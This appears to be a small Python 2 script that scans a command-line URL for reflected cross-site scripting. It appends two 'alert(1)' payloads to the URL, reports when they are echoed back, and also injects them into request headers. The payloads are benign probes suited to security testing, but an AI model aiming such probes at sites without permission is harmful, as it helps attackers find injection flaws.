import requests
import sys

payloads = ['<script>alert(1);</script>', '<BODY ONLOAD=alert(1)>']

def XSS_tester(url):
	print "[+] Testing for XSS on the URL Parameters Dicovered..\n"
	
	for payload in payloads:
		req = requests.post(url+payload)
		if payload in req.text:
			print "[!] Parameter vulnerable\r\n"
			print "[-] Attack string: "+payload
			print req.text
			break

def XSS_header(url):
	headers ={}
	r = requests.head(url)
	print "[+] Testing for XSS on the URL headers.\n"
	for payload in payloads:
		for header in r.headers:
			headers[header] = payload
		req = requests.post(url, headers=headers)


url = sys.argv[1]
XSS_tester(url)
XSS_header(url)